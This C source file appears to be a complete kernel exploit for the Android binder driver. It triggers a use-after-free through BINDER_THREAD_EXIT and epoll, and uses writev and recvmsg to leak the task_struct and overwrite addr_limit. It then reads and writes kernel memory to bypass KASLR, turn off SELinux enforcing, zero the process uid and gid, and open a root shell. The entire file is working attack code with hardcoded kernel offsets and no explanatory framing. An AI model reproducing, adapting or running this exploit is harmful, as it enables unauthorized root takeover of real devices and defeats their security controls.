#define _GNU_SOURCE  
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>

#define BINDER_THREAD_EXIT 0x40046208
#define INIT_USER_NS 0x94ee8f0
#define SELINUX_ENFORCING 0x96b6c10

// offsetof(binder_thread.wait.task_list.next) = 0xA8
#define OFFSET_BINDER_WAITTASK_NEXT 0xA8
// offsetof(binder_thread.task) = 0x190
#define OFFSET_BINDER_TASK 0x190
// offsetof(task_struct.thread_info.addr_limit) = 0x8
#define OFFSET_ADDR_LIMIT 8
// offsetof(task_struct.cred) = 0x760
#define OFFSET_CRED 0x760
// offsetof(task_struct.user_ns) = 0x88
#define OFFSET_USER_NS 0x88
// offsetof(cred.uid) = 4
#define OFFSET_UID 4
// offsetof(cred.gid) = 8
#define OFFSET_GID 8

void dump(char *data, size_t nb_pointers) {
  uint64_t *leak = (uint64_t *)data;

  printf("0000: ");
  for (size_t i = 0; i < nb_pointers; i++) {
    printf("%016lx ", leak[i]);

    if ((i + 1) % 4 == 0) {
      printf("\n");
      if (i + 1 < nb_pointers) {
        printf("%04lX: ", (i + 1) * 8);
      }
    }
  }
}

uint64_t leak_task_struct() {
	// Prepare the binder	
	int fd_binder = open("/dev/binder", O_RDONLY);
	if (fd_binder == -1) {
		perror("open");
	}
	int epfd = epoll_create(1000);
	if (epfd == 1) {
		perror("epfd");
	}
	struct epoll_event event = { .events = EPOLLIN };
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd_binder, &event);	  // Allocate

	// Prepare the iovec buffer 
	// Its low 4 bytes address must be equal to 0
	char* iobuf = (char*) mmap((void*)0x1000000000, 0x1000, 
		  PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
	if (iobuf < 0) {
		perror("mmap");
		return 0;
	}
	memset(iobuf, 0x41, 0x1000);

	// Prepare the iovec
  struct iovec iov[25];
	memset(iov, 0, sizeof(iov));
	iov[10].iov_base = iobuf;
  iov[10].iov_len = 0x1000;

	char tmp[0x1000];
	memset(tmp, 0x42, sizeof(tmp));
	iov[11].iov_base = tmp;
  iov[11].iov_len = 0x1000;

  int pipefd[2];
  pipe(pipefd);
	fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000);

	int fork_pid = fork();
	if (!fork_pid) { 				                              // Parent process
		sleep(1);
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd_binder, &event); 	// UAF
		
		char data[0x1000];
		read(pipefd[0], data, sizeof(data));
		
		exit(0);
	}
	printf("Free the binder object and writev()\n");
	ioctl(fd_binder, BINDER_THREAD_EXIT, NULL); 	        // Free 
	writev(pipefd[1], iov, 25);
	
	// Read back our binder thread object	
	// We have overwritten the pointer at +0xa0
	printf("UAF triggered, reading back the values\n");
	char data[0x1000];
	memset(data, 0, sizeof(data));
	read(pipefd[0], data, sizeof(data));
	dump(data, 16);

	char* binder_thread = data;
	uint64_t task_struct = *(uint64_t*)(
      binder_thread - OFFSET_BINDER_WAITTASK_NEXT + OFFSET_BINDER_TASK);
	return task_struct;
}

void smash_address(uint64_t target_address, uint64_t smash_value) {
	// Prepare the binder	
	int fd_binder = open("/dev/binder", O_RDONLY);
	if (fd_binder == -1) {
		perror("open");
	}
	int epfd = epoll_create(1000);
	if (epfd == 1) {
		perror("epfd");
	}
	struct epoll_event event = { .events = EPOLLIN };
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd_binder, &event);	  // Allocate

	// Prepare the iovec buffer 
	// Its address low 4 bytes must be equal to 0
	char* iobuf = (char*) mmap((void*)0x2000000000, 0x1000, 
		  PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);
	if (iobuf < 0) {
		perror("mmap");
		return;
	}
	memset(iobuf, 0x41, 0x1000);

	// Prepare the iovec
  struct iovec iov[25];
	memset(iov, 0, sizeof(iov));
	iov[10].iov_base = iobuf;
  iov[10].iov_len = 8;
	iov[11].iov_base = iobuf;
  iov[11].iov_len = 0x20;
	iov[12].iov_base = iobuf;
  iov[12].iov_len = 8;

	int fds[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, fds);	

	int fork_pid = fork();
	if (!fork_pid) {	                                    // Parent process
		sleep(1);
		
		char buff[0x1000];
		memset(buff, 0x41, sizeof(buff));
		*(uint64_t*)(buff + 0x00) = 0xcafecafe;	
		*(uint64_t*)(buff + 0x08) = 0xcafecafe;	
		*(uint64_t*)(buff + 0x10) = 0xcafecafe;	
		*(uint64_t*)(buff + 0x18) = target_address;	
		*(uint64_t*)(buff + 0x20) = smash_value;	
	
		write(fds[1], buff, 8); 	// make it wait
		epoll_ctl(epfd, EPOLL_CTL_DEL, fd_binder, &event); 	// UAF
		write(fds[1], buff, 0x20 + 0x08);	
		// 0x20: overwrite iovec buffer address
		// 0x08: do a normal write on the iovec buffer
		exit(0);
	}
	printf("Free the binder object and recvmsg()\n");
	ioctl(fd_binder, BINDER_THREAD_EXIT, NULL); 	        // Free 
	
	struct msghdr msg = {
		.msg_iov = iov,
		.msg_iovlen = 25
	};
	recvmsg(fds[0], &msg, MSG_WAITALL);
	wait(0);
}

void readn_kernel(uint64_t kernel_addr, void* obj, size_t size) {
	int pipefd[2];
	pipe(pipefd);
	write(pipefd[1], (void*)kernel_addr, size);	
	read(pipefd[0], obj, size);
}
uint64_t read64_kernel(uint64_t kernel_addr) {
	uint64_t value = 0;
	readn_kernel(kernel_addr, &value, sizeof(value));
	return value;
}
void write32_kernel(unsigned long long kernel_addr, uint32_t value) {
	int pipefd[2];
	pipe(pipefd);
	write(pipefd[1], &value, 4);	
	read(pipefd[0], (void*)kernel_addr, 4);
}

void pincpu() {
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set); 
	if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
		perror("setaffinity");
	}
}

int main() {
	pincpu();

	printf("-- LEAK\n");
	uint64_t task_struct = leak_task_struct();	
	if (!task_struct) {
		return 1;
	}
	printf("task_struct: 0x%016lx\n", task_struct);

	printf("\n-- SMASH\n");
	smash_address(task_struct + OFFSET_ADDR_LIMIT, 0xffffffffffffffff);

	printf("\n-- PRIVESC\n");
	uint64_t cred = read64_kernel(task_struct + OFFSET_CRED); 
	uint64_t user_ns = read64_kernel(cred + OFFSET_USER_NS);
	printf("user_ns = %016lx\n", user_ns);
	uint64_t kernel_base = user_ns - INIT_USER_NS;
	printf("kernel base = %016lx\n", kernel_base);        // KASLR bypass

	printf("Overwriting selinux_enforcing\n");
	write32_kernel(kernel_base + SELINUX_ENFORCING, 0);		

	printf("Setting sid and gid to 0\n");	
	write32_kernel(cred + OFFSET_UID, 0);	
	write32_kernel(cred + OFFSET_GID, 0);	

	printf("Opening a root shell\n");
	system("/bin/sh");
	
	return 0;
}
